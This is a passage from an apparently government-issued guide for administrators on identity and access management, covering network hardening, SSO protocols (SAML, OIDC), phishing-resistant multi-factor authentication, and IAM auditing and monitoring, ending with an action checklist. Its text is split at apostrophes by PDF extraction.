ensure compatibility. Proceed to patch and update all impacted
devices and/or software as soon as possible.
Ensure an intrusion detection system is in place to alert
security operations teams of any suspicious IAM activity.
Develop and set a network baseline so that anomalous network
traffic and/or behaviors can be identified and flagged for
security analysis to determine if it is a result of malicious or
unauthorized activity.
Follow the 
3-2-1 principles
 in the event of a disk failure or
other disaster: maintain three copies of the data, in at least two
mediums, with one being offsite.
Build resiliency in the IAM system in order to prevent access
loss due to failure. This resiliency can also have the added
benefit of providing better performance through maintaining a
lower baseload. Geodiversity should be considered in the
resiliency plan for the IAM system.
Limit user account permissions to those that are necessary to
perform their job. IAM solutions can help handle this through
locking down privileged accounts, protecting user credentials,
and making it easier to assign users to groups with specific
permissions.
Identity and Access Management: Recommended Best Practices for Administrators
Network
Segmentation
Network
Security
Assessment
Protect and
Manage
Critical IAM
Assets
Actions to Take Now
Develop policies where normal users, system administrators,
and other privileged (e.g., operation and management,
application/process, alias, backup, etc.) accounts are separated
to ensure that all accesses are using least privilege permissions.
Audit all assets regularly in the organization to identify local
identities. Remove unnecessary local identities and investigate
to identify who or what process created the local identity.
Monitor remaining local identities for anomalous behavior.
Carefully design and implement network segmentation with
security in mind to limit the spread of an intrusion and to
disrupt attempts to escalate privilege.
Isolate IAM systems in a dedicated network segment with
layers of security controls between the IAM systems and other
systems inside and/or outside the organization.
Perform regular security penetration testing and asset
vulnerability security scanning to understand attack surfaces
from both outside and inside the organizational boundaries.
Prioritize security hardening efforts on externally exposed
assets.
Assess the access allowed internally and the current
vulnerabilities that could be exploited by an internal and/or
external threat actor. Implement least privilege and access
monitoring to reduce risk.
Identify your credential/trust stores, control access paths, and
provide enterprise-wide management.
Protect keys and certificates at appropriate assurance levels 
consider hardware-based security modules for critical items
such as signing keys.
Understand tradeoffs between on-premises and cloud based
IAM services and ensure visibility into the security of cloud
services used.
Recognize and mitigate risks of using 3rd party applications for
IAM functions.
Take an inventory of all assets within the organization. If there is something
missing, or if there are additional assets that are unknown, determine the cause of
the discrepancy.
Identify all the local identities on the assets in order to know who has access to
which assets.
Understand what security controls are in the enterprise environment now and what
security gaps persist in an organization
s enterprise environment.
Develop a network traffic baseline that can be used to detect security anomalies in
the network. Any compromise to any component in a network has the potential to
threaten more critical enterprise systems, including IAM.
Identity and Access Management: Recommended Best Practices for Administrators
Summary
IAM solutions are only one part of a wider enterprise environment, where compromises in
one area can eventually lead to compromises in another. Hardening the enterprise
environment, including the IAM systems as critical resources, helps to limit the potential
for a compromise and keep the IAM system safe and accessible.
Identity Federation and Single Sign-On
Identity federation using SSO within and/or between organizations, including the
utilization of identity providers, mitigates risks by centrally managing differences in
policies and risk levels between the organizations and eliminates wide implementation and
dependence on local identities. Without formally defining the policies and levels of trust
and assurance between organizations or between multiple identity providers within an
organization, the organization is susceptible to attacks based on weaknesses in each
federated IAM. SSO provides a risk mitigation capability by centralizing the management
and control of authentication and access across multiple systems and from multiple
identity providers. Implemented properly, it can also raise the authentication assurance
level required for initial sign on and can control and secure the authentication and
authorization information passed between systems.
What it Does
Identity Federation and SSO simplifies identity management internally within an enterprise
and with trusted external partners by reducing the need for users to maintain multiple
identities in both internal and external directories, applications, and other platforms,
eliminating the need for local identities at each asset. It allows for seamless integration
with other security controls such as privileged access management for step-up
authentication and increases confidence that only active users are allowed access.
Additionally, it reduces the labor costs associated with managing multiple identities for
each user on the various on-premises and/or cloud-based applications.
Why it Matters
Passwords are a vulnerability due to the complexity of requiring a user to remember multicharacter passwords that almost every application requires today. SSO nominally reduces
the user burden to remembering one solid, complex, and hard-to-guess passphrase, and
facilitates the migration to strong MFA, potentially eliminating passwords altogether.
Implementing both Identity Federation and SSO supporting strong MFA allows for
improved security without compromising the user experience.
Locally provisioned accounts (e.g., user, system, process, admin) on individual assets
creates an unmanageable environment and is a lucrative target by bad actors. For example:
Locally provisioned accounts may or may not allow for security policy enforcement.
Identity and Access Management: Recommended Best Practices for Administrators
Massive volumes of locally provisioned accounts on individual systems across the
enterprise cannot be maintained. These accounts can include shared accounts,
vendor default accounts, and unknown accounts (e.g., ex-employee, ex-vendor).
Security event monitoring is ineffective on locally provisioned accounts. For
instance, the ability to monitor and detect shared accounts, stolen credentials, and
cracked credentials (e.g., password spraying) is considerably more difficult given
the volumes of assets, accounts, and individual asset configurations.
Adversaries, both internal and external threat actors, can exploit the security policy
and/or security event monitoring gaps in one system to compromise the assets it
manages and use their access as a foothold to launch exploits against other systems.
Identity Federation and SSO drastically reduce the need for locally provisioned accounts
and enables IAM administrators to have more centralized visibility and control over
accounts. It also enables more effective management of default and/or shared accounts
that are required on an individual asset. For example, most default and shared accounts can
be disabled and those that cannot be disabled can have passwords changed to highly
random values protected in a password vault.
Factors to consider when selecting an SSO solution
SSO services may use different protocols, such as SAML or Open ID Connect (OIDC). When
selecting an SSO service, it is important to keep in mind the following factors:
SAML
What protocol is being used?
How has the service provider secured the protocol and the service?
SAML is used for exchanging authentication and authorization data between identity
providers and service providers. One of the most common use cases for SAML is facilitating
browser-based SSO. Up until the past few years, SAML was considered the industry
standard and proven workhorse for passing an authenticated user into applications while
allowing these applications to defer authentication to a centralized identity solution.
If the services use SAML, specific implementation and hardening measures are a must to be
a secure SSO option as it is prone to exploits if it is not implemented correctly. Every year
brings new issues with SAML 
 in the form of newly discovered exploits 
 which gives it a
reputation of not being the most secure option.
OIDC was created to address some of the flaws in SAML However, SAML is still considered
a relevant option for SSO and there are still requirements for developers to support it in
modern environments.
OpenID Connect
OAuth 2.0 is designed only for authorization for granting access to data and features from
one application to another. OIDC is a thin layer that sits on top of OAuth 2.0 that adds login
and profile information about the person who is logged in. OIDC enables scenarios where
Identity and Access Management: Recommended Best Practices for Administrators
one login can be used across multiple applications (i.e., SSO). An application could support
SSO using social networking services (i.e., Facebook or Twitter) so that users can choose to
leverage a login they already have. Authorization code flow enables the applications to first
get authorization codes instead of getting tokens directly from the authorization callback
request. It then uses these codes in a request to another endpoint on the authorization
server to exchange them for the tokens they need. The most significant advantage that this
flow has in relation to the implicit flow is its security. There are two characteristics of the
authorization code flow that make it a better choice than SAML when it comes to security.
An example of the authorization code flow is depicted in Figure 2 below.
Figure 2 Diagram of Authorization Code Flow 8
First, the process to exchange codes for tokens happens on back channels. Instead of
having tokens traveling through users
 devices, the application opens a back channel
connection to the authorization server, eliminating the need to pass credentials and
other information through the users
 devices (like browsers). By establishing a
direction connection to each other, the application and authentication server reduce the
chances that certain credentials will be exposed. When registering a Web App, the call
back configuration is important from a security point of view because it restricts what
URLs the OIDC provider is allowed to call after a successful authentication process.
The second characteristic is that, before issuing tokens, authorization servers require
applications to authenticate themselves. This authentication process usually happens
by applications using credentials that authorization servers assign to them.
https://portswigger.net/web-security/oauth/grant-types.
Identity and Access Management: Recommended Best Practices for Administrators
In summary, OIDC is a more secure and reliable protocol because it uses a direct channel
between the applications and the authentication server, protecting identity tokens.
Implementing Best Practices
Organizations should consider the following when assessing their SSO capability and
making improvements to counter their organization
s top threats and plan for periodic
reassessments to ensure updates are made as needs change.
 Define and understand how assets are audited for any local accounts and/or
identities configured and active.
 Define and understand how the engagement with trusted partners to audit for any
local accounts and/or identities configured and active.
 For any required and authorized local accounts/identities, define a password policy,
and auditing to ensure compliance.
 Define a policy that disallows local accounts on any platform.
 Implement a configuration management solution which supports the identification,
tracking, and reporting of any local accounts.
 Identify and track all exceptions for systems, platforms, and/or applications that
require local accounts. Disable those that are not necessary and establish and
enforce password policies for those that are. Review these periodically with the
application teams and/or vendors in an effort to drive them to SSO support.
 Ensure SSO availability. If SSO fails, access to all related systems is lost. Therefore, it
is key to have a solid high availability design and plan implementation which
includes both local and regional geographic redundancy and the appropriate
security hardening guidelines.
Actions to Take Now
Assess your organization
s internal on-premises applications/devices/platforms
and your cloud providers ability to connect using SSO.
Determine if your SSO integration can collect user context during SSO logins
including location, device, and behavior.
Summary
Organizations should develop and deploy SSO friendly applications and platforms to
eliminate all local accounts and/or identities. Doing so will improve the user experience
while also significantly reducing the risk associated with local accounts which are difficult
to manage and monitor. Local accounts that use shared passwords (e.g., root) create legal
and forensic issues for the organization when attempting to identify the attacker
s identity.
Multi-Factor Authentication
Since the introduction of multi-user computer systems, user authentication has primarily
relied on usernames and passwords. MFA is an approach to strengthen the authentication
process by requiring the user to present multiple elements in different categories, or
Identity and Access Management: Recommended Best Practices for Administrators
factors
, as part of an authentication attempt. These factors are as shown in Figure 3 are
something you have, something you know, and something you are.
Figure 3 Multi-Factor Authentication Factors
MFA incorporates more than one of the above factors as part of a login flow. Examples
include:
 Typing a password and responding to a push notification sent to a registered
smartphone.
 Typing a password and providing a one-time code from a hardware authentication
device.
 Using a biometric facial scan and/or passphrase to unlock a cryptographic
credential stored on a registered device (i.e. phone, hardware token).
Authentication systems are the front doors to enterprise networks, applications, and data.
As such, attackers are highly focused on finding and exploiting authentication
vulnerabilities. Authentication systems are also high-volume user interfaces and frequently
seen as friction points between users and their ability to perform their business functions.
This combination of characteristics poses a challenge for systems engineers and
implementers since they must be seamless and user-friendly yet also strongly resistant to
attacks.
MFA authenticators may take the form of software that runs on a smartphone or other
device or dedicated hardware tokens. Some MFA solutions are designed to augment
passwords with an additional factor, whereas, 
passwordless
 solutions can eliminate the
need for passwords altogether. Passwordless MFA solutions typically involve the use of
two factors together, such as a cryptographic credential stored on a hardware token that is
unlocked using a memorized PIN. Table X below lists some common forms of MFA.
Identity and Access Management: Recommended Best Practices for Administrators
MFA Type
One-time
Passwords
(OTP)
Examples
OTP delivered out of band by simple
messaging service (SMS) or email
Hardware OTP token
Mobile OTP app
Mobile app that presents options to
approve or reject a login event from
another device
Out-of-band
Push
Notification
Cryptographic Fast Identity Online (FIDO) hardware
authenticator token
FIDO software token (e.g, Passkey)
Smartcard
Software Public Key Infrastructure (PKI)
credential unlocked with biometric
Relevant Standards
HMAC-based OTP (HOTP)
 RFC 4226 9
Time-based OTP (TOTP) 
RFC 6238 10
CTAP2 11
Web Authentication 12
NIST SP 800-74 13
NIST SP 800-157 14
It is important to note that not all MFA solutions provide equal protection against
authentication attacks, and there are critical implementation details that can impact the
security and usability of an MFA deployment. The following subsections provide guidance
for selecting and implementing an MFA solution. Further guidance is also available in the
National Institute of Standards and Technology (NIST) Special Publication (SP) 800-63 15,
s publication, Selecting Secure Multi-factor Authentication Solutions 16, and the
Cybersecurity Infrastructure Security Agency
s guidance on MFA. 17
What It Does
MFA was created to address the shortcomings of passwords including the fact that:
Passwords can be shared with unauthorized users;
Users can be tricked into giving their passwords to attackers through phishing; and
Users tend to use the same or closely related passwords across multiple websites,
services, and computer systems, meaning a breach of one system allows an attacker
to obtain usernames and passwords that can be used in other systems using
techniques such as credential stuffing.
9 https://datatracker.ietf.org/doc/html/rfc4226.
10 https://datatracker.ietf.org/doc/html/rfc6238.
11 https://fidoalliance.org/specs/fido-v2.1-ps-20210615/fido-client-to-authenticator-protocol-v2.1-ps-
20210615.html.
12 https://www.w3.org/TR/webauthn-2/.
13 https://nvlpubs.nist.gov/nistpubs/specialpublications/nist.sp.800-73-4.pdf.
14 https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-157.pdf.
15 NIST Special Publication, 800-63AB.
16 CSI_MULTIFACTOR_AUTHENTICATION_SOLUTIONS_UOO17091520.PDF (defense.gov).
17 https://www.cisa.gov/mfa.
Identity and Access Management: Recommended Best Practices for Administrators
MFA mitigates common attacks against passwords such as brute force guessing and
credential stuffing as well as common misuse practices such as password sharing by
requiring the presentation of another factor in addition to the password. Unless an attacker
can defeat the MFA authentication mechanism, knowing the password by itself does not
enable impersonation of the user. In the case of passwordless authentication systems,
passwords are eliminated altogether as an attack vector.
Some, but not all, MFA solutions also mitigate phishing attacks. Given the prevalence of
phishing as an attack vector, phishing resistance should be a key consideration in choosing
an MFA solution. Figure 4 represents different types of MFA ranging from weakest to
strongest.
Figure 4 Weakest to Strongest Types of MFA 18
The following are some general guidelines around MFA and phishing:
One-time passwords, whether generated in an app or hardware token or delivered
through SMS, e-mail, or some other out-of-band method, do not protect against
phishing unless they are combined with some other phishing-resistant technology
such as mutual TLS authentication. Because the user enters the one-time password
into a login form, a phishing site can capture an OTP just as easily as a password
and replay it to the legitimate site or application in real-time.
Push notification-based authenticator apps that prompt the user to approve login
attempts also generally do not protect against phishing. A phishing site can trigger a
login attempt that will send a push notification to the user
s registered device and
the user may have no way of determining whether the notification is legitimate.
Some attackers have had success rates simply triggering push notifications to users
who are not even attempting to log in at the time. 19 Some push notification-based
MFA solutions provide additional context about the authentication attempt, such as
18 https://www.cisa.gov/mfa.
19 What Are Push Attacks? | HYPR.
Identity and Access Management: Recommended Best Practices for Administrators
the location from which it originated, to aid the user in determining whether it is
legitimate. If the login request came from a phishing site, the detected location of
the login attempt should not match the user
s current location. However, location
can be spoofed, and the basic issue remains that the push notification is not
strongly bound to a legitimate authentication attempt and the service to which the
user is authenticating.
Further guidance is also available in CISA
s publication Implementing Phishing-Resistant
MFA. 20
Phishing-resistant forms of MFA include:
 FIDO authenticators 
 a wide range of interoperable authenticators, both built into
commonly-used operating systems (Windows, MacOS, iOS Android) and available in
hardware tokens, based on industry standards maintained by the FIDO Alliance and
the World Wide Consortium (W3C).
 PKI credentials, in the form of software crypto modules, smartcards, and other
hardware tokens.
Why MFA Matters
MFA solutions can mitigate many of the most common attacks against authentication
systems:
Credential stuffing is the attempt to use known username/password credentials
obtained from one system (typically through compromise and cracking of the
password database) to access other systems. Credential stuffing takes advantage of
the tendency for users to reuse the same credentials for multiple sites and services.
With MFA, these stolen credentials are not sufficient to gain access to a user
account because the attacker cannot bypass second-factor authentication.
Password spraying is a similar attack where the attacker tries a relatively short list
of the most commonly-used passwords against a list of known usernames. Typically,
the attacker tries a small number of passwords for each user account to avoid
triggering the account lockout threshold to reduce the risk of detection. If a system
locks users after 10 failed attempts, the attacker may try 9 passwords for each
username. Again, MFA can prevent account takeover even if the attacker discovers
valid username/password credentials by requiring an additional authentication
factor.
Phishing is an attempt to trick users into logging into an attacker-controlled system
and capture their credentials. As described above, some MFA authentication
systems prevent phishing by using protocols designed such that a phishing site
cannot simply 
replay
 the authentication protocol messages against the legitimate
site.
Brute-force attacks are the simplest form of password attacks, where an attacker
simply tries different passwords in the hopes of finding valid credentials. Account
20 Implementing Phishing-Resistant MFA (cisa.gov).
Identity and Access Management: Recommended Best Practices for Administrators
lockouts make these attacks much more time-consuming, but strong MFA can
completely mitigate them.
Preparation for Implementing MFA
Before deploying MFA, it is important to understand the full scope of use cases and
scenarios the MFA solution needs to address. An ad-hoc approach can lead to incomplete
coverage, multiple systems, and users needing to enroll multiple MFA mechanisms to
access all the applications they need. Up-front planning and strategy definitions can help
ensure a smooth, coherent implementation. This section details several aspects to consider
and further information can be found in the NSA publication 
Transition to Multi-Factor
Authentication
 21 and in CISA
s publication 
Capacity Implementation Guide: Implementing
Strong Authentication.
Catalog User Populations, Device Types, and Use Cases
Consider the needs of different user groups to best determine how to handle MFA
enrollment. Questions to consider include:
What types of authenticators are suitable for each based on assurance level,
usability, supportability, and cost?
What are the various device platforms your MFA solution needs to accommodate?
Desktops, laptops, smartphones, and tablets are common requirements.
Is MFA also needed for networking devices or other equipment?
What are the potential device compatibility issues for both software and hardware
MFA solutions? It is important to consider up-to-date operating systems and
browsers, available USB ports (with their A/C/Micro variations), or support for
Bluetooth or Near-Field Communications (NFC). It
s also important to consider the
security profiles of the devices and the difference between devices under enterprise
management and monitoring, devices managed by a different organization, and
personal, unmanaged devices, especially regarding software solutions.
Also consider the different support needed for operating environments. In operating
environments with shared workstations, portable authenticators would probably be most
appropriate verses software authenticators tied to a specific device. Additionally, in
operating environments that have users with managed mobile devices, the iOS and Android
platforms both provide built-in authentication capabilities using the FIDO standards and
numerous other vendors offer authenticator applications that could meet your MFA needs
without buying additional hardware. However, if there are high-security environments
such as research facilities where electronic devices are not admitted, smartphone-based
authenticators would not be appropriate.
21 https://media.defense.gov/2019/Sep/09/2002180346/-1/-1/0/Transition%20to%20Multifactor%20Authentication%20-%20Copy.pdf.
22https://www.cisa.gov/sites/default/files/publications/CISA_CEG_Implementing_Strong_Authentication_50
8_1.pdf.
Identity and Access Management: Recommended Best Practices for Administrators
It is important to note that organizations may find that a single MFA solution cannot
accommodate all their needs, especially if managing access for external users. Deploying
different MFA solutions for different groups of users may be required. This is a situation
where ID Federation/SSO will be important.
Evaluate Assurance Requirements
Some use cases, applications, or data types may require higher-assurance authentication
than others. For example, privileged users with operating system or database
administration rights should have strong, phishing-resistant authentication. The use of
separate user-level and administrative accounts and credentials for individuals with
privileged access and Privileged Access Management (PAM) systems that provide auditing
of privileged access use are additional best practices for managing privileged access that
can be deployed in conjunction with MFA. PAM may also provide work-flow management
and be a credential proxy for systems that don
t support the selected MFA. Other high-risk
roles or functions may also require special protections if they involve management of highvalue assets or critically sensitive information.
For reference, NIST SP 800-63-3 provides guidelines for performing a risk assessment to
guide selection and implementation of identity and authentication systems, including MFA.
Also consider any regulatory or compliance mandates applicable to your organization,
which may include requirements that are relevant to MFA solutions, such as the use of
Federal Information Protection Standards (FIPS) 140-3 validated cryptography or FIPS 201
(PIV).
Evaluate Privacy and Operational Considerations
Many MFA solutions incorporate biometric authentication of the user, which can raise
concerns over privacy. The biometric authentication solutions in most widespread use
today, such as the facial recognition and fingerprint unlock mechanisms built into
smartphones, keep biometric templates in hardware-protected storage and are designed to
prevent the removal of biometric data from the device. When these systems are used to
authenticate to systems and services, the biometric matching occurs locally on the mobile
device, and successful authentication unlocks a private key that is then used in the actual
authentication protocol carried out over the network. These types of protections are
requirements for FIDO-certified devices. Using solutions that bind biometrics templates to
a single device, instead of storing them in a central database, may help alleviate privacy
concerns.
Equity across demographic groups is another potential issue with biometrics; some
biometric solutions perform differently for individuals of different ages, genders, and/or
ethnicities. Pilot testing with a representative cross-section of your user base can help
identify any potential issues. Aspects of your users
 operating environment may also impact
the suitability of specific biometric modalities; the use of gloves or masks, for example, may
preclude facial or fingerprint authentication.
Identity and Access Management: Recommended Best Practices for Administrators
Implementing MFA
The following are some best practices and considerations when embarking on an MFA
implementation.
Implement MFA as part of an enterprise SSO solution. Integrating MFA with all of an
organization
s applications can be a daunting prospect; it
s also not the best way to go
about an MFA implementation. MFA integration is complex, and small mistakes can lead to
issues like the ability for attackers to bypass MFA. This is a job for experienced IAM
practitioners and vendors, not an additional-duty-as-assigned for application developers.
Also, allowing individual applications and projects to choose their own MFA solutions leads
to a complex environment where users need to manage multiple authenticators to access
all the applications they need. Having multiple MFA infrastructures also expands the attack
surface and complicates maintenance.
Instead, as discussed in the previous section, MFA should be integrated into an enterprise
authentication and SSO service that uses industry-standard, tested and proven protocols,
like SAML, or OpenID Connect and OAuth 2.0, to connect with your applications. A single,
centralized authentication service is simpler to test, secure, and maintain than several
independent application-level implementations. In addition, a centralized SSO system can
enable enterprise risk-based authentication policies to selectively require MFA. When a
user has an active session with the SSO service, policies can determine whether they need
to authenticate again when accessing additional applications. Policies can trigger the need
to re-authenticate or perform step-up authentication (i.e., requiring higher-assurance
authentication than was used to initially establish a user
s session) when users access
sensitive applications or perform high-risk activities. This provides the flexibility to require
high assurance when needed without frustrating users engaged in routine, low-risk tasks
with repeated MFA prompts. It also provides an integration point for Zero Trust
Architecture (ZTA) policies such as requiring re-authentication or step-up based on risk
signals from threat defense systems.
Consider the total account and authenticator lifecycle, and exception processes.
Procuring an MFA system and enrolling users is only the beginning of the process. It
important to consider all the needed workflows for authenticator lifecycle management
and how edge cases and failure scenarios will be handled. Initial MFA enrollment (or
issuance, in the case of hardware authenticators) process must provide adequate assurance
that the authorized user is enrolled in the MFA system. Consider the use of multiple
communication channels to provide additional assurance. For example, if a hardware token
is physically mailed to a user, require additional authentication (e.g., with their password
or a one-time secret provided out-of-band) as part of the enrollment process.
Maintain an inventory of the authenticators deployed in your environment.
Vulnerabilities may be discovered in both software and hardware authenticators, so it
critical to be able to identify authenticators in need of replacement or upgrade. Pay
attention to vendor announcements and support lifecycles, and plan well in advance for
any end-of-life authenticator solutions in need of replacement. For mobile authenticator
Identity and Access Management: Recommended Best Practices for Administrators
apps, consider your device refresh period and how users will enroll a new device. Also have
a response plan for lost or stolen authenticators or devices to rapidly disable the lost
authenticator and enable the user to enroll a new one. This can be one of the most
challenging aspects to manage 
 if a user can enroll a new MFA authenticator using their
password alone, this severely undermines the security of your MFA solution. A best
practice, particularly in passwordless environments, is to issue multiple strong
authenticators to each user, perhaps with one kept in reserve in a secure location to allow
access and enrollment of a new authenticator in case the primary authenticator is lost. A
simpler solution is using backup one-time codes, kept in secure storage by the user.
Routinely test and rapidly patch your MFA infrastructure. This is good advice for any
system or application, but it is especially critical for MFA and other authentication
infrastructure. Promptly test and install any vendor security patches. Routinely test your
registration and authentication flows, especially when changes are made to your
infrastructure.
Realize that MFA is not the only solution required for securing identities and access.
MFA is a critical security control, but it is only one component of securing access to your
systems and applications. MFA (and SSO) enable users to establish a session with an
application, but the application must implement secure session management with timeouts
for inactivity and maximum session lifetimes. Applications and client devices must protect
cookies and tokens that can allow impersonation of the user if stolen. MFA cannot prevent
malware on client devices from capturing users
 credentials or application data. It
important to understand that while MFA addresses some of the most common threats, MFA
should be part of a holistic cybersecurity architecture.
Actions to Take Now
Determine the MFA solution best suited in your organization
s operating
environment.
Implement MFA as part of an enterprise SSO solution.
Maintain a robust inventory of the MFA authenticators deployed in your
organization
s operating environment.
Routinely test and patch your organization
s MFA infrastructure.
Summary
MFA can provide strong protection against many of the most prevalent attacks against
authentication systems. Careful planning will help ensure that your MFA implementation
meets your organization
s needs and provides both security and usability. As with any
enduring capability, it
s important to consider the full lifecycle management of MFA
authenticators and infrastructure. Integrating MFA with an enterprise SSO system is
essential to facilitate application adoption and enable a coherent enterprise authentication
policy.
Identity and Access Management: Recommended Best Practices for Administrators
IAM Auditing and Monitoring
IAM auditing and monitoring should not only check for compliance, but also monitor for
threat indicators and anomalous activities. This encompasses the generation, collection,
and analysis of logs, events, and other information to provide the best means of detecting
compliance related infractions and suspicious activities. Attacks such as use of stolen
credentials and misuse of privileged access by insiders would not be detected in a timely
manner, if at all, without an effective IAM auditing and monitoring program. These auditing
and monitoring capabilities can be integrated with automated tools that orchestrate
response actions to counter these IAM attacks. Effective reporting from auditing and
monitoring also provide situational awareness of the security posture of an organization
IAM.
What it Does
IAM auditing and monitoring:
Provides deterrent to users especially privileged users who know their actions are
being tracked;
Provides awareness of how system is being used and attempted to be misused;
Detects problems and potential problems through indicators of attack/compromise
and changes in behavior; and
Collects forensic evidence which also supports evaluation of effectiveness leading to
improvements in capabilities.
Why it Matters
There are many types of threats that IAM auditing and monitoring can counter but they
tend to fall into one of two buckets; insider threat and unauthorized access. Insider threats
range from authorized using their privileges to perform inappropriate actions (e.g.
downloading a list of current customers) to administrators seeking to cause harm to the
organization, to former employees whose access was not turned off. For example, in
September 2022, an individual working as a cybersecurity professional in a Hawaiianbased financial company, pled guilty and admitted that, after severing ties with the
company, he utilized the credentials of his former employer to gain access to the company
website configuration settings and purposefully misdirected web and email traffic to
computers unaffiliated with the company incapacitating the company
s website and
email. 23 IAM auditing and monitoring could have potentially prevented this by allowing the
system to remove the user
s access upon separation from the company.
Unauthorized access can occur when external systems or users with lower assurance (i.e.
weaker authentication) inappropriately gains access to an organization
s system and data.
Further, exploitation of vulnerabilities in security protocols, cryptographic algorithms,
and/or third-party programs could also lead to unauthorized access. Additionally,
23 https://www.justice.gov/usao-hi/pr/honolulu-man-pleads-guilty-sabotaging-former-employer-s-
computer-network.
Identity and Access Management: Recommended Best Practices for Administrators
unauthorized access can occur with the theft or hijacking of a legitimate user
s credentials
to attack an organization
s system with the stolen or hijacked credentials. In this instance,
the impostor
s behavior and actions will likely be different from the normal behavior of the
legitimate user and can lead to detection of the identity theft. The legitimate user may also
receive notifications of log in failures or other activity that they did not perform and can
provide out of band information to help detect the impostor.
Preparation for Implementing Best Practice
Below are key considerations for assessing an organization
s auditing and monitoring
capability to determine which improvements are necessary to counter top threats. It is
important to note that this is not a one-time assessment. Assessments should be made
periodically, and capabilities updated in order to meet changing needs and be better
postured to counter new threats.
Organization defines and understands what is considered normal/acceptable
behavior, suspect behavior, and misbehavior.
Organization uses defined and de-facto policy rules, requirements/models of
systems, and baselines of current activity to identify monitoring and analysis
parameters.
Organization identifies users with access to critical assets (e.g., crown jewels) and
focuses enhanced monitoring on critical assets (proprietary information, systems
mission critical); Identify, prioritize assets).
Collect data including standard logs/audit records, and security events as well as
other data about the users, systems, applications, and network behaviors. Use the
collected data for real-time detection and alerting, storage for forensic use,
baselining of current behavior, analysis to detect trends, and indications of
anomalous behavior.
Behavioral analytics will require an initial period (and ongoing updates) of
collection and analysis to establish baselines and thresholds. This should address
normal day, busy day, and emergency situation baselines.
Avoid collection and analysis that does not provide useful information such a large
number of unprioritized alerts that require human analysis since this is a waste of
systems and human resources and will not achieve better cybersecurity. Collecting
and analyzing data that provides actionable information to your staff and
management to raise security awareness and can support the business case for
additional funding to improving your IAM auditing and monitoring capabilities.
Determine the appropriate tools and capabilities to effectively derive information
from the collected data. Consider what data formats and content can be processed,
configurability, scalability, growth capability to provide or interface with other
systems and capabilities. For example, a SIEM tool that can accommodate SOAR
capability or one that can work with advanced analytic tools including machine
learning.
The tools and capabilities should match and best augment your staff skills and
availability. Manual review of logs or of overly detailed or too frequent tool outputs
will not be effective. If your current tools are at the basic SIEM level, focus on
Identity and Access Management: Recommended Best Practices for Administrators
configuring them to alert on your most critical events and provide the most
pertinent info to staff. Organizations with more sophisticated capabilities should
start looking for anomalous behavior and developing procedures on how to deal
with potential insider threats. For example, when to shut them down immediately
versus when to steer them to honeypots and collect more forensics evidence.
Initiatives such as the Defense Advanced Research Projects Agency
s (DARPA) Anomaly
Detection at Multiple Scales (ADAMS) Project 24 provide valuable information for
organizations to use as a starting point when attempting to identify and remediate insider
threats. The project developed an Anomaly Detection Engine for Networks (ADEN) to
detect malicious users and characterize anomalous behavior typical of malicious users, to
support improved prediction-based actionable intelligence and response. While only a
small percentage of anomalous behavior was associated with malicious users, the project
did highlight several key findings associated with behavior of malicious users, including:
Malicious users were more active and chose to 
do nothing
 significantly less times
than benign users.
Malicious users fetched significantly more sensitive information than benign users.
Though malicious users appeared to save more data to removable devices than
benign users, these differences were not found to be statistically significant in our
study.
Malicious users edited the data slightly less compared to benign players users.
However, these differences also were not found be statistically significant.
Malicious users sent significantly more information out of the organization than
benign users.
Malicious users fetched significantly less un-sensitive data in contrast to the benign
players.
Actions to Take Now
Establish baseline expectations of activity levels and policy and monitor privileged
user behavior for both acceptable and suspicious activity. Avoid automatic response
actions to suspicious behavior that could be important and legitimate (e.g. system
administrator that flags as unusual activity due to logging in from a remote location
on a weekend however could be responding to an emergency network problem).
Include manual procedures to confirm the legitimacy of these actions before
determining how to respond. For example, if the activity includes setting up new
accounts or changing privileges a first step would be to determine if there are
indications that this may be a malicious insider attack versus preparing for the
startup of a new program.
Monitor general user behaviors in both good and bad terms such as how many
successful access attempts versus unsuccessful, what hours typically worked,
whether remote access allowed, what systems accessed and amounts of data
downloaded.
https://www.darpa.mil/program/anomaly-detection-at-multiple-scales.
Identity and Access Management: Recommended Best Practices for Administrators
Monitor activity between applications and systems and associated network traffic
for changes in connectivity, level of activity, and types of data. If an attacker is
attempting to move laterally within your network, this may include accesses and
traffic that are unusual.
Monitor external traffic that may include new interactions with previously unknown
sites or different types and levels of interactions. Remember that data exfiltration
attacks may be 
low and slow
 so a change may be small, but ongoing. Be careful to
not include this in an accepted baseline of activity.
Summary
Organizations will need to be able to monitor for anomalous behavior (in addition to
traditional security events and logs) to detect the various threats to IAM systems that are
present and potentially harmful. An initial assessment should be performed to understand
current capabilities with a plan to improve an organization
s capability to collect, analyze,
detect, and respond to indicators of attack and compromise.
Conclusion
America
s critical infrastructure is a prime target for a broad spectrum of threat sources
including advanced and ongoing attacks from nation state and terrorist organizations
attacks. These threats are real, ongoing, and evolving and the cybersecurity community is
especially concerned about certain credible threats to IAM and SSO. IAM weaknesses are
frequently exploited in the most insidious threats, APTs, which have led to catastrophic
data breaches. The use of SSO without a good MFA foundation and secure design
selections, exacerbates the damage of attacks that an organization may be vulnerable to
such as password cracking and authenticator hijacking.
The intent of this paper was to provide a clear understanding of how various mitigations
counter the threats and to provide actionable recommendations on what organizations
should do now. This includes:
Assess your current IAM capabilities and risk posture.
For areas that need improvement: select, layer, integrate, and properly configure
secure solutions following the best practices provided herein and in referenced
guidance.
Maintain the appropriate level of security to manage risk during continued
operations.
Maintain awareness of correct IAM usage and of risks.
Ultimately every organization has the obligation to ensure their IAM and SSO capabilities
are secure to protect not only their own assets but that of their partners and consumers as
Identity and Access Management: Recommended Best Practices for Administrators
Appendix I: Actions to Take Now Checklist
Environmental Hardening
 Take an inventory of all assets within the organization. If there is something missing, or
if there are additional assets that are unknown, determine the cause of the discrepancy.
 Identify all the local identities on the assets in order to know who has access to which
assets.
 Understand what security controls are in the enterprise environment now and what
security gaps persist in an organization
s enterprise environment.
 Develop a network traffic baseline that can be used to detect security anomalies in the
network. Any compromise to any component in a network has the potential to threaten
more critical enterprise systems, including IAM.
Identity Federation/Single Sign-On
 Assess your organization
s internal on-premises applications/devices/platforms and
your cloud providers ability to connect using single sign-on.
 Determine if your single sign-on integration can collect user context during single signon logins including location, device, and behavior.
Multi-Factor Authentication
 Determine the MFA solution best suited in your organization
s operating environment.
Implement MFA as part of an enterprise SSO solution.
 Maintain a robust inventory of the MFA authenticators deployed in your organization
operating environment.
 Routinely test and patch your organization
s MFA infrastructure.
IAM Auditing and Monitoring
 Establish baseline expectations of activity levels and policy and monitor privileged user
behavior for both acceptable and suspicious activity. Avoid automatic response actions to
suspicious behavior that could be important and legitimate (e.g. system administrator that
